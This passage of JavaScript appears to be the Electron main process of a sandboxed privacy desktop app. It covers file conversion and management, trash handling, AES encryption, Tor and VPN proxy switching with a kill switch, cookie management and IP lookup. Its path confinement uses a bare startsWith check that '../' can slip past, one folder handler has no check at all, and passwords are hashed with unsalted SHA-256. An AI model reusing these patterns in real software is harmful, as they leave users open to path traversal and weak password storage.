        console.log('writeFile failed, trying alternative method:', writeError.message);
        // Some versions of pptxgenjs support stream or buffer methods
        if (pptx.write) {
          const buffer = await pptx.write({ outputType: 'nodebuffer' });
          fs.writeFileSync(filePath, buffer);
        } else {
          throw writeError;
        }
      }

      // Notify privacy monitor
      const appName = getAppNameFromWindow(event.sender);
      notifyPrivacyMonitor('write', filePath, appName);

      return { success: true };
    } catch (error) {
      console.error('PPTX conversion error:', error);
      console.error('Error stack:', error.stack);
      console.error('Error details:', {
        message: error.message,
        name: error.name,
        code: error.code
      });
      return { success: false, error: error.message + (error.stack ? '\n' + error.stack.split('\n')[0] : '') };
    }
  });

  ipcMain.handle('convert-to-xlsx', async (event, spreadsheetData, filePath) => {
    try {
      const XLSX = require('xlsx');

      // Validate path
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      // Convert spreadsheet data to worksheet format
      const worksheet = {};
      const maxRow = 100;
      const maxCol = 26;
      const colNames = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';

      // Create range
      const range = { s: { c: 0, r: 0 }, e: { c: maxCol - 1, r: maxRow - 1 } };

      // Process data
      for (let row = 1; row <= maxRow; row++) {
        for (let col = 0; col < maxCol; col++) {
          const addr = colNames[col] + row;
          const value = spreadsheetData[addr];

          if (value !== undefined && value !== null && value !== '') {
            const cellAddress = XLSX.utils.encode_cell({ c: col, r: row - 1 });
            worksheet[cellAddress] = { v: value, t: typeof value === 'number' ? 'n' : 's' };
          }
        }
      }

      worksheet['!ref'] = XLSX.utils.encode_range(range);

      // Create workbook
      const workbook = XLSX.utils.book_new();
      XLSX.utils.book_append_sheet(workbook, worksheet, 'Sheet1');

      // Ensure directory exists
      const dir = path.dirname(filePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }

      // Write file
      XLSX.writeFile(workbook, filePath);

      // Notify privacy monitor
      const appName = getAppNameFromWindow(event.sender);
      notifyPrivacyMonitor('write', filePath, appName);

      return { success: true };
    } catch (error) {
      console.error('XLSX conversion error:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('convert-to-csv', async (event, spreadsheetData, filePath) => {
    try {
      // Validate path
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      // Convert spreadsheet data to CSV
      const maxRow = 100;
      const maxCol = 26;
      const colNames = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
      const rows = [];

      // Find the actual data range
      let maxDataRow = 0;
      let maxDataCol = 0;

      for (let row = 1; row <= maxRow; row++) {
        for (let col = 0; col < maxCol; col++) {
          const addr = colNames[col] + row;
          const value = spreadsheetData[addr];
          if (value !== undefined && value !== null && value !== '') {
            maxDataRow = Math.max(maxDataRow, row);
            maxDataCol = Math.max(maxDataCol, col);
          }
        }
      }

      // Generate CSV rows
      for (let row = 1; row <= maxDataRow; row++) {
        const csvRow = [];
        for (let col = 0; col <= maxDataCol; col++) {
          const addr = colNames[col] + row;
          const value = spreadsheetData[addr] || '';
          // Escape CSV values (handle quotes and commas)
          const escaped = String(value).replace(/"/g, '""');
          csvRow.push(`"${escaped}"`);
        }
        rows.push(csvRow.join(','));
      }

      const csvContent = rows.join('\n');

      // Ensure directory exists
      const dir = path.dirname(filePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }

      // Write file
      fs.writeFileSync(filePath, csvContent, 'utf-8');
      return { success: true };
    } catch (error) {
      console.error('CSV conversion error:', error);
      return { success: false, error: error.message };
    }
  });

  // Open isolated folder in file explorer (deprecated - use file manager instead)
  ipcMain.handle('open-isolated-folder', async () => {
    try {
      // Instead of opening system explorer, launch file manager window
      return createAppWindow('filemanager');
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // List files in isolated documents folder
  ipcMain.handle('list-documents', async () => {
    try {
      const files = [];
      if (fs.existsSync(ISOLATED_DOCUMENTS_PATH)) {
        const items = fs.readdirSync(ISOLATED_DOCUMENTS_PATH, { withFileTypes: true });
        for (const item of items) {
          const fullPath = path.join(ISOLATED_DOCUMENTS_PATH, item.name);
          const stats = fs.statSync(fullPath);
          files.push({
            name: item.name,
            path: fullPath,
            isDirectory: item.isDirectory(),
            size: stats.size,
            modified: stats.mtime.getTime(),
            extension: path.extname(item.name).toLowerCase()
          });
        }
      }
      // Sort: directories first, then by name
      files.sort((a, b) => {
        if (a.isDirectory !== b.isDirectory) {
          return a.isDirectory ? -1 : 1;
        }
        return a.name.localeCompare(b.name);
      });
      return files;
    } catch (error) {
      throw error;
    }
  });

  // Open file with appropriate app
  ipcMain.handle('open-file-in-app', async (event, filePath) => {
    try {
      // Validate path is within isolated environment
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      const ext = path.extname(filePath).toLowerCase();
      let appType = null;

      // Determine app based on file extension
      if (['.doc', '.docx', '.txt', '.rtf', '.html', '.htm'].includes(ext)) {
        appType = 'word';
      } else if (['.xls', '.xlsx', '.csv', '.json'].includes(ext)) {
        appType = 'finance';
      }

      if (appType) {
        const windowId = createAppWindow(appType, { filePath: filePath });
        return { success: true, windowId: windowId };
      } else {
        return { success: false, error: 'Unsupported file type' };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Encryption operations (for password manager and security apps)
  ipcMain.handle('encrypt-data', async (event, data, key) => {
    try {
      const encrypted = CryptoJS.AES.encrypt(data, key).toString();
      return encrypted;
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('decrypt-data', async (event, encrypted, key) => {
    try {
      const bytes = CryptoJS.AES.decrypt(encrypted, key);
      return bytes.toString(CryptoJS.enc.Utf8);
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('hash-password', async (event, password) => {
    try {
      return CryptoJS.SHA256(password).toString();
    } catch (error) {
      throw error;
    }
  });

  // Tor Mode Handler
  ipcMain.handle('set-tor-mode', async (event, enabled) => {
    try {
      if (enabled) {
        // Configure Tor proxy (default Tor SOCKS5 port)
        // Note: This requires Tor to be running locally or a Tor proxy
        const torProxy = 'socks5://127.0.0.1:9050';
        session.defaultSession.setProxy({
          proxyRules: torProxy
        });
        torModeEnabled = true;

        // TOR HARDENING: Set Chromium proxy and DNS rules to prevent leaks
        // Note: commandLine switches must be set before app.whenReady(),
        // but we can update session proxy which affects new connections
        console.log('[Tor] Tor mode enabled - routing through Tor proxy');
        console.log('[Tor] Chromium hardening: All browser traffic will route through Tor');
      } else {
        torModeEnabled = false;
        // Disable Tor - check if VPN is active, otherwise use no proxy
        if (currentVpnProxy) {
          // VPN is active, keep it
          console.log('[Tor] Tor disabled, VPN proxy still active');
        } else {
          // No VPN, disable all proxies for normal browsing
          session.defaultSession.setProxy({
            proxyRules: ''
          });
          console.log('[Tor] Tor disabled, all proxies cleared for normal browsing');
        }
      }
      return { success: true };
    } catch (error) {
      throw error;
    }
  });

  // Ad Blocker Handlers
  ipcMain.handle('adblocker-get-status', () => {
    return { enabled: adBlockerEnabled };
  });

  ipcMain.handle('adblocker-set-status', (event, enabled) => {
    adBlockerEnabled = enabled;
    return { success: true, enabled: adBlockerEnabled };
  });

  // Cookie Manager Handlers
  ipcMain.handle('cookies-get-all', async (event, domain) => {
    try {
      const cookies = await session.defaultSession.cookies.get({ domain: domain || undefined });
      return { success: true, cookies: cookies };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('cookies-delete', async (event, url, name) => {
    try {
      await session.defaultSession.cookies.remove(url, name);
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('cookies-delete-domain', async (event, domain) => {
    try {
      const cookies = await session.defaultSession.cookies.get({ domain: domain });
      for (const cookie of cookies) {
        const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain}${cookie.path}`;
        await session.defaultSession.cookies.remove(url, cookie.name);
      }
      return { success: true, deleted: cookies.length };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('cookies-get-domains', async () => {
    try {
      const cookies = await session.defaultSession.cookies.get({});
      const domains = new Set();
      cookies.forEach(cookie => {
        const domain = cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain;
        domains.add(domain);
      });
      return { success: true, domains: Array.from(domains).sort() };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Trash/Recycle Bin Handlers
  ipcMain.handle('trash-list', async () => {
    try {
      const files = [];
      if (fs.existsSync(ISOLATED_TRASH_PATH)) {
        const items = fs.readdirSync(ISOLATED_TRASH_PATH, { withFileTypes: true });
        for (const item of items) {
          const fullPath = path.join(ISOLATED_TRASH_PATH, item.name);
          const stats = fs.statSync(fullPath);
          // Parse metadata if it exists
          let originalPath = fullPath;
          let deletedDate = stats.mtime.getTime();
          const metadataPath = fullPath + '.trashmeta';
          if (fs.existsSync(metadataPath)) {
            try {
              const metadata = JSON.parse(fs.readFileSync(metadataPath, 'utf8'));
              originalPath = metadata.originalPath || fullPath;
              deletedDate = metadata.deletedDate || deletedDate;
            } catch (e) {
              // Ignore metadata parse errors
            }
          }
          files.push({
            name: item.name,
            path: fullPath,
            originalPath: originalPath,
            isDirectory: item.isDirectory(),
            size: stats.size,
            deleted: deletedDate,
            extension: path.extname(item.name).toLowerCase()
          });
        }
      }
      files.sort((a, b) => b.deleted - a.deleted); // Newest first
      return { success: true, files: files };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Delete file (move to trash)
  ipcMain.handle('delete-file', async (event, filePath) => {
    try {
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      const fileName = path.basename(filePath);
      const trashPath = path.join(ISOLATED_TRASH_PATH, fileName);

      // If file already exists in trash, add timestamp
      let finalTrashPath = trashPath;
      if (fs.existsSync(trashPath)) {
        const ext = path.extname(fileName);
        const base = path.basename(fileName, ext);
        finalTrashPath = path.join(ISOLATED_TRASH_PATH, `${base}_${Date.now()}${ext}`);
      }

      // Move file to trash
      fs.renameSync(filePath, finalTrashPath);

      // Save metadata
      const metadata = {
        originalPath: filePath,
        deletedDate: Date.now()
      };
      fs.writeFileSync(finalTrashPath + '.trashmeta', JSON.stringify(metadata));

      return true;
    } catch (error) {
      throw error;
    }
  });

  // Rename file
  ipcMain.handle('rename-file', async (event, filePath, newName) => {
    try {
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      if (!newName || !newName.trim()) {
        throw new Error('Invalid file name');
      }

      const dir = path.dirname(filePath);
      const newPath = path.join(dir, newName.trim());

      // Check if new name already exists
      if (fs.existsSync(newPath)) {
        throw new Error('A file with this name already exists');
      }

      fs.renameSync(filePath, newPath);
      return true;
    } catch (error) {
      throw error;
    }
  });

  // Copy file
  ipcMain.handle('copy-file', async (event, sourcePath, destPath) => {
    try {
      if (!sourcePath.startsWith(ISOLATED_DATA_PATH) || !destPath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      // Ensure destination directory exists
      const destDir = path.dirname(destPath);
      if (!fs.existsSync(destDir)) {
        fs.mkdirSync(destDir, { recursive: true });
      }

      // Copy file
      fs.copyFileSync(sourcePath, destPath);
      return true;
    } catch (error) {
      throw error;
    }
  });

  // Get file stats/properties
  ipcMain.handle('get-file-stats', async (event, filePath) => {
    try {
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      if (!fs.existsSync(filePath)) {
        throw new Error('File does not exist');
      }

      const stats = fs.statSync(filePath);
      return {
        name: path.basename(filePath),
        path: filePath,
        size: stats.size,
        isDirectory: stats.isDirectory(),
        isFile: stats.isFile(),
        created: stats.birthtime.getTime(),
        modified: stats.mtime.getTime(),
        accessed: stats.atime.getTime(),
        extension: path.extname(filePath).toLowerCase(),
        mode: stats.mode.toString(8)
      };
    } catch (error) {
      throw error;
    }
  });

  ipcMain.handle('trash-delete', async (event, filePath) => {
    try {
      if (!filePath.startsWith(ISOLATED_DATA_PATH)) {
        throw new Error('File access is restricted to the isolated environment');
      }

      const fileName = path.basename(filePath);
      const trashPath = path.join(ISOLATED_TRASH_PATH, fileName);
      const metadataPath = trashPath + '.trashmeta';

      // If file already exists in trash, add timestamp
      let finalTrashPath = trashPath;
      if (fs.existsSync(trashPath)) {
        const ext = path.extname(fileName);
        const base = path.basename(fileName, ext);
        finalTrashPath = path.join(ISOLATED_TRASH_PATH, `${base}_${Date.now()}${ext}`);
      }

      // Move file to trash
      fs.renameSync(filePath, finalTrashPath);

      // Save metadata
      const metadata = {
        originalPath: filePath,
        deletedDate: Date.now()
      };
      fs.writeFileSync(finalTrashPath + '.trashmeta', JSON.stringify(metadata));

      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('trash-restore', async (event, trashPath) => {
    try {
      if (!trashPath.startsWith(ISOLATED_TRASH_PATH)) {
        throw new Error('Invalid trash path');
      }

      const metadataPath = trashPath + '.trashmeta';
      let originalPath = trashPath;

      if (fs.existsSync(metadataPath)) {
        const metadata = JSON.parse(fs.readFileSync(metadataPath, 'utf8'));
        originalPath = metadata.originalPath;
      }

      // Restore file
      if (fs.existsSync(originalPath)) {
        // Original path exists, add timestamp
        const ext = path.extname(originalPath);
        const base = path.basename(originalPath, ext);
        const dir = path.dirname(originalPath);
        originalPath = path.join(dir, `${base}_restored_${Date.now()}${ext}`);
      }

      fs.renameSync(trashPath, originalPath);
      if (fs.existsSync(metadataPath)) {
        fs.unlinkSync(metadataPath);
      }

      return { success: true, restoredPath: originalPath };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('trash-empty', async () => {
    try {
      if (fs.existsSync(ISOLATED_TRASH_PATH)) {
        const items = fs.readdirSync(ISOLATED_TRASH_PATH);
        for (const item of items) {
          const itemPath = path.join(ISOLATED_TRASH_PATH, item);
          const stats = fs.statSync(itemPath);
          if (stats.isDirectory()) {
            fs.rmSync(itemPath, { recursive: true, force: true });
          } else {
            fs.unlinkSync(itemPath);
          }
          // Also delete metadata
          const metadataPath = itemPath + '.trashmeta';
          if (fs.existsSync(metadataPath)) {
            fs.unlinkSync(metadataPath);
          }
        }
      }
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Desktop Folder Handlers
  ipcMain.handle('desktop-create-folder', async (event, folderName) => {
    try {
      const folderPath = path.join(ISOLATED_DESKTOP_PATH, folderName);
      if (fs.existsSync(folderPath)) {
        throw new Error('Folder already exists');
      }
      fs.mkdirSync(folderPath, { recursive: true });
      return { success: true, path: folderPath };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('desktop-list-items', async () => {
    try {
      const items = [];
      if (fs.existsSync(ISOLATED_DESKTOP_PATH)) {
        const files = fs.readdirSync(ISOLATED_DESKTOP_PATH, { withFileTypes: true });
        for (const file of files) {
          const fullPath = path.join(ISOLATED_DESKTOP_PATH, file.name);
          const stats = fs.statSync(fullPath);
          items.push({
            name: file.name,
            path: fullPath,
            isDirectory: file.isDirectory(),
            size: stats.size,
            modified: stats.mtime.getTime(),
            extension: path.extname(file.name).toLowerCase()
          });
        }
      }
      return { success: true, items: items };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Screen Lock Handler
  ipcMain.handle('screen-lock', async () => {
    // Lock screen by minimizing all windows
    if (desktopWindow && !desktopWindow.isDestroyed()) {
      desktopWindow.webContents.send('screen-locked');
    }
    appWindows.forEach((appData) => {
      if (appData.window && !appData.window.isDestroyed()) {
        appData.window.hide();
      }
    });
    return { success: true };
  });


  // Volume Control (using system commands)
  ipcMain.handle('get-volume', async () => {
    try {
      // Windows volume control
      if (process.platform === 'win32') {
        const { execSync } = require('child_process');
        const result = execSync('powershell -Command "(Get-AudioDevice -List | Where-Object {$_.Type -eq \'Render\'}).Volume"', { encoding: 'utf8' });
        const volume = parseInt(result.trim()) || 50;
        return { success: true, volume: volume };
      }
      return { success: true, volume: 50 }; // Default
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('set-volume', async (event, volume) => {
    try {
      if (process.platform === 'win32') {
        const { execSync } = require('child_process');
        execSync(`powershell -Command "(Get-AudioDevice -List | Where-Object {$_.Type -eq 'Render'}).Volume = ${Math.max(0, Math.min(100, volume))}"`);
        return { success: true };
      }
      return { success: false, error: 'Volume control not supported on this platform' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // Brightness Control
  ipcMain.handle('get-brightness', async () => {
    try {
      if (process.platform === 'win32') {
        const { execSync } = require('child_process');
        const result = execSync('powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness"', { encoding: 'utf8' });
        const brightness = parseInt(result.trim()) || 100;
        return { success: true, brightness: brightness };
      }
      return { success: true, brightness: 100 }; // Default
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('set-brightness', async (event, brightness) => {
    try {
      if (process.platform === 'win32') {
        const { execSync } = require('child_process');
        const level = Math.max(0, Math.min(100, brightness));
        execSync(`powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, ${level})"`);
        return { success: true };
      }
      return { success: false, error: 'Brightness control not supported on this platform' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // VPN Kill Switch
  let vpnKillSwitchEnabled = false;
  let vpnKillSwitchMonitoring = false;
  let lastVpnStatus = false;

  ipcMain.handle('vpn-killswitch-get-status', () => {
    return { enabled: vpnKillSwitchEnabled };
  });

  ipcMain.handle('vpn-killswitch-set-status', (event, enabled) => {
    vpnKillSwitchEnabled = enabled;
    if (enabled && !vpnKillSwitchMonitoring) {
      startVpnKillSwitchMonitoring();
    }
    return { success: true, enabled: vpnKillSwitchEnabled };
  });

  function startVpnKillSwitchMonitoring() {
    if (vpnKillSwitchMonitoring) return;
    vpnKillSwitchMonitoring = true;

    // Monitor VPN status every 2 seconds
    const monitorInterval = setInterval(() => {
      if (!vpnKillSwitchEnabled) {
        clearInterval(monitorInterval);
        vpnKillSwitchMonitoring = false;
        return;
      }

      // Check VPN status from desktop window
      if (desktopWindow && !desktopWindow.isDestroyed()) {
        desktopWindow.webContents.send('vpn-killswitch-check');
      }
    }, 2000);
  }

  // Listen for VPN status updates from desktop
  ipcMain.on('vpn-status-update', (event, connected) => {
    if (vpnKillSwitchEnabled) {
      if (lastVpnStatus && !connected) {
        // VPN dropped - disconnect network
        console.log('[VPN KILL SWITCH] VPN dropped, disconnecting network...');
        session.defaultSession.setProxy({ proxyRules: '' });
        if (desktopWindow && !desktopWindow.isDestroyed()) {
          desktopWindow.webContents.send('vpn-killswitch-triggered');
        }
      }
      lastVpnStatus = connected;
    }
  });

  // VPN Proxy Configuration
  // Map of VPN locations to proxy servers
  // Configure your VPN service proxy servers here or via environment variables
  // Format: 'socks5://host:port' or 'http://host:port' or 'https://host:port'
  // Example: 'socks5://us1234.nordvpn.com:1080'
  // 
  // Default: Uses bundled Tor (socks5://127.0.0.1:9050) - Tor will start automatically
  // Override by setting environment variables or editing this map
  const TOR_PROXY = 'socks5://127.0.0.1:9050'; // Bundled Tor proxy (starts automatically)
  const VPN_PROXY_MAP = {
    'United Kingdom-London': process.env.VPN_PROXY_UK || TOR_PROXY,
    'United States-New York': process.env.VPN_PROXY_US || TOR_PROXY,
    'Germany-Frankfurt': process.env.VPN_PROXY_DE || TOR_PROXY,
    'Japan-Tokyo': process.env.VPN_PROXY_JP || TOR_PROXY,
    'Canada-Toronto': process.env.VPN_PROXY_CA || TOR_PROXY,
    'France-Paris': process.env.VPN_PROXY_FR || TOR_PROXY,
    'Netherlands-Amsterdam': process.env.VPN_PROXY_NL || TOR_PROXY,
    'Singapore-Singapore': process.env.VPN_PROXY_SG || TOR_PROXY,
    'Australia-Sydney': process.env.VPN_PROXY_AU || TOR_PROXY,
    'Switzerland-Zurich': process.env.VPN_PROXY_CH || TOR_PROXY,
    'Sweden-Stockholm': process.env.VPN_PROXY_SE || TOR_PROXY,
    'Brazil-São Paulo': process.env.VPN_PROXY_BR || TOR_PROXY,
    'South Korea-Seoul': process.env.VPN_PROXY_KR || TOR_PROXY,
    'India-Mumbai': process.env.VPN_PROXY_IN || TOR_PROXY,
    'Spain-Madrid': process.env.VPN_PROXY_ES || TOR_PROXY,
    'Italy-Milan': process.env.VPN_PROXY_IT || TOR_PROXY,
    'Poland-Warsaw': process.env.VPN_PROXY_PL || TOR_PROXY,
    'Norway-Oslo': process.env.VPN_PROXY_NO || TOR_PROXY,
    'Denmark-Copenhagen': process.env.VPN_PROXY_DK || TOR_PROXY,
    'Finland-Helsinki': process.env.VPN_PROXY_FI || TOR_PROXY
  };

  console.log('[VPN] VPN locations configured to use Tor proxy (bundled Tor will start automatically)');

  // Default VPN location for auto-connect on startup
  // Set this to auto-connect to a specific location on first startup
  const DEFAULT_VPN_LOCATION = process.env.VPN_DEFAULT_LOCATION || 'United States-New York';

  // Helper function to check if Tor is running
  async function checkTorRunning() {
    if (!currentVpnProxy || !currentVpnProxy.includes('127.0.0.1:9050')) {
      return true; // Not using Tor, skip check
    }

    // Use bundled Tor manager if available
    if (torManager) {
      try {
        const isRunning = await torManager.isTorRunning();
        if (!isRunning) {
          // Try to start bundled Tor
          console.log('[VPN] Starting bundled Tor daemon...');
          await torManager.start();
          return true;
        }
        return true;
      } catch (error) {
        console.warn('[VPN] Bundled Tor not available:', error.message);
        // Fall back to checking if external Tor is running
      }
    }

    // Check if external Tor is running
    try {
      const http = require('http');
      return new Promise((resolve) => {
        const req = http.get('http://127.0.0.1:9050', { timeout: 2000 }, (res) => {
          resolve(true);
        });
        req.on('error', () => resolve(false));
        req.on('timeout', () => {
          req.destroy();
          resolve(false);
        });
      });
    } catch (e) {
      return false;
    }
  }

  ipcMain.handle('vpn-set-proxy', async (event, locationData) => {
    try {
      if (!locationData) {
        // Disconnect VPN - clear all proxies for normal browsing
        // (Tor will be handled separately if enabled)
        if (!torModeEnabled) {
          session.defaultSession.setProxy({
            proxyRules: ''
          });
        } else {
          // Tor is enabled, keep it active
          session.defaultSession.setProxy({
            proxyRules: 'socks5://127.0.0.1:9050'
          });
        }
        currentVpnProxy = null;
        console.log('[VPN] VPN disconnected, proxies cleared for normal browsing');
        return { success: true, message: 'VPN disconnected' };
      }

      const { country, city } = locationData;
      const locationKey = `${country}-${city}`;
      const proxyServer = VPN_PROXY_MAP[locationKey];

      if (!proxyServer) {
        // No proxy configured for this location - show warning but allow fake location
        console.warn(`[VPN] No proxy server configured for ${locationKey}. Using fake location only.`);
        if (!torModeEnabled) {
          session.defaultSession.setProxy({
            proxyRules: PROXY_SERVER || ''
          });
        }
        currentVpnProxy = null;
        return {
          success: false,
          message: 'No proxy server configured for this location',
          isFakeLocation: true
        };
      }

      // Check if using Tor and verify it's running BEFORE setting proxy
      const isTor = proxyServer && proxyServer.includes('127.0.0.1:9050');
      const proxyType = isTor ? 'Tor' : 'VPN';

      if (isTor) {
        console.log('[VPN] Tor proxy detected, checking if Tor is running...');
        // Check if Tor is running BEFORE setting proxy to avoid blocking internet
        let torRunning = false;
        if (torManager) {
          try {
            torRunning = await torManager.isTorRunning();
            if (!torRunning) {
              // Try to start bundled Tor
              console.log('[VPN] Tor not running, attempting to start bundled Tor...');
              try {
                await torManager.start();
                // Wait for Tor to bootstrap (can take 30-60 seconds on first launch)
                // First launch: Tor needs to download directory info, establish circuits, etc.
                // Subsequent launches: Usually faster (10-20 seconds)
                console.log('[VPN] Waiting for Tor to bootstrap (this may take up to 60 seconds on first launch)...');
                let attempts = 0;
                const maxAttempts = 60; // Wait up to 60 seconds (first launch can be slow)
                while (attempts < maxAttempts) {
                  await new Promise(resolve => setTimeout(resolve, 1000));
                  torRunning = await torManager.isTorRunning();
                  if (torRunning) {
                    // Also verify Tor is actually responding (not just process running)
                    try {
                      const http = require('http');
                      const isResponding = await new Promise((resolve) => {
                        const req = http.get('http://127.0.0.1:9050', { timeout: 2000 }, () => {
                          resolve(true);
                        });
                        req.on('error', () => resolve(false));
                        req.on('timeout', () => {
                          req.destroy();
                          resolve(false);
                        });
                      });
                      if (isResponding) {
                        console.log('[VPN] Tor is ready and responding');
                        break;
                      }
                    } catch (e) {
                      // Continue waiting
                    }
                  }
                  attempts++;
                  if (attempts % 10 === 0) {
                    console.log(`[VPN] Still waiting for Tor to bootstrap... (${attempts}s / ${maxAttempts}s)`);
                  }
                }
                if (!torRunning) {
                  console.warn('[VPN] Tor did not start within timeout period. Internet access will continue without VPN.');
                }
              } catch (startError) {
                console.warn('[VPN] Failed to start bundled Tor:', startError.message);
              }
            }
          } catch (error) {
            console.warn('[VPN] Error checking Tor status:', error.message);
          }
        }

        // Also check external Tor as fallback
        if (!torRunning) {
          try {
            const http = require('http');
            torRunning = await new Promise((resolve) => {
              const req = http.get('http://127.0.0.1:9050', { timeout: 2000 }, () => {
                resolve(true);
              });
              req.on('error', () => resolve(false));
              req.on('timeout', () => {
                req.destroy();
                resolve(false);
              });
            });
          } catch (e) {
            torRunning = false;
          }
        }

        if (!torRunning) {
          console.error('[VPN] Tor is not running and could not be started. Clearing proxy to allow normal internet access.');
          // Clear proxy to allow normal internet access
          session.defaultSession.setProxy({
            proxyRules: ''
          });
          currentVpnProxy = null;
          // Clear proxy from all windows
          const allWindows = BrowserWindow.getAllWindows();
          for (const win of allWindows) {
            if (win && !win.isDestroyed()) {
              const winSession = win.webContents.session;
              if (winSession && winSession !== session.defaultSession) {
                winSession.setProxy({
                  proxyRules: ''
                });
              }
            }
          }
          return {
            success: false,
            error: 'Tor is not running. Please start Tor Browser or install bundled Tor.',
            message: 'VPN connection failed - using normal internet access'
          };
        } else {
          console.log('[VPN] Tor is running and ready');
        }
      }

      // Set the proxy for this location (only if Tor is running or not using Tor)
      session.defaultSession.setProxy({
        proxyRules: proxyServer
      });
      currentVpnProxy = proxyServer;

      // Apply proxy to all existing webview sessions (they use different partitions)
      // Get all BrowserWindows and their webContents
      const allWindows = BrowserWindow.getAllWindows();
      for (const win of allWindows) {
        if (win && !win.isDestroyed()) {
          const winSession = win.webContents.session;
          if (winSession && winSession !== session.defaultSession) {
            winSession.setProxy({
              proxyRules: proxyServer
            });
          }
        }
      }

      // Also apply to all webview partitions (webviews use partition: 'persist:webview')
      try {
        // Webviews typically use partition 'persist:webview' or similar
        // Apply to common webview partitions
        const webviewPartitions = ['persist:webview', 'webview'];
        for (const partition of webviewPartitions) {
          try {
            const partitionSession = session.fromPartition(partition);
            partitionSession.setProxy({
              proxyRules: proxyServer
            });
            console.log(`[VPN] Applied proxy to partition: ${partition}`);
          } catch (e) {
            // Partition might not exist, that's ok
          }
        }
      } catch (e) {
        // Ignore errors
      }

      console.log(`[VPN] VPN proxy set for ${locationKey}: ${proxyServer} (${proxyType})`);
      return { success: true, message: `Connected to ${city}, ${country} via ${proxyType}`, proxyServer };
    } catch (error) {
      console.error('[VPN] Error setting proxy:', error);
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('vpn-get-current-proxy', () => {
    return { proxy: currentVpnProxy };
  });

  // Fetch IP address through VPN proxy (uses session proxy settings)
  // Use desktop window's webContents.executeJavaScript to make fetch request
  // which automatically uses the session's proxy settings (including Tor)
  ipcMain.handle('vpn-fetch-ip', async (event) => {
    if (!desktopWindow || desktopWindow.isDestroyed()) {
      return { success: false, error: 'Desktop window not available' };
    }

    const apis = [
      { url: 'https://ipapi.co/json/', name: 'ipapi' },
      { url: 'https://api.ipify.org?format=json', name: 'ipify' },
      { url: 'https://ip-api.com/json/', name: 'ip-api' },
      { url: 'https://api.myip.com', name: 'myip' },
      { url: 'https://ifconfig.co/json', name: 'ifconfig' }
    ];

    // Use desktop window's webContents to make the request
    // This automatically uses the session's proxy settings (including Tor)
    const webContents = desktopWindow.webContents;

    for (const api of apis) {
      try {
        const response = await webContents.executeJavaScript(`
          (async () => {
            try {
              const controller = new AbortController();
              const timeoutId = setTimeout(() => controller.abort(), 5000);
              
              const response = await fetch('${api.url}', {
                headers: { 'Accept': 'application/json' },
                signal: controller.signal
              });
              
              clearTimeout(timeoutId);

              if (!response.ok) {
                throw new Error('HTTP ' + response.status);
              }
              return await response.json();
            } catch (error) {
              throw new Error(error.message || 'Fetch failed');
            }
          })()
        `);

        // Normalize response format
        let normalizedData;
        if (api.name === 'ipify') {
          normalizedData = {
            ip: response.ip,
            city: null,
            region: null,
            country_name: 'Unknown',
            org: 'Unknown'
          };
        } else if (api.name === 'ip-api') {
          normalizedData = {
            ip: response.query || response.ip,
            city: response.city,
            region: response.regionName,
            country_name: response.country,
            org: response.org || response.isp
          };
        } else if (api.name === 'myip') {
          normalizedData = {
            ip: response.ip,
            city: null,
            region: null,
            country_name: response.country,
            org: 'Unknown'
          };
        } else if (api.name === 'ifconfig') {
          normalizedData = {
            ip: response.ip,
            city: response.city,
            region: response.region_name,
            country_name: response.country,
            org: response.asn_org || response.asn
          };
        } else {
          // ipapi.co format
          normalizedData = {
            ip: response.ip,
            city: response.city,
            region: response.region,
            country_name: response.country_name,
            org: response.org
          };
        }

        console.log('[VPN] Successfully fetched IP via', api.name + ':', normalizedData.ip, normalizedData.country_name);
        console.log('[VPN] Using desktop window session (proxy: ' + currentVpnProxy + ')');
        return { success: true, data: normalizedData };
      } catch (error) {
        console.warn(`[VPN] Failed to fetch IP from ${api.name}:`, error.message);
        // Try next API
        continue;
      }
    }

    return { success: false, error: 'All IP APIs failed' };
  });

  // Tor Manager IPC Handlers (bundled Tor)
  if (torManager) {
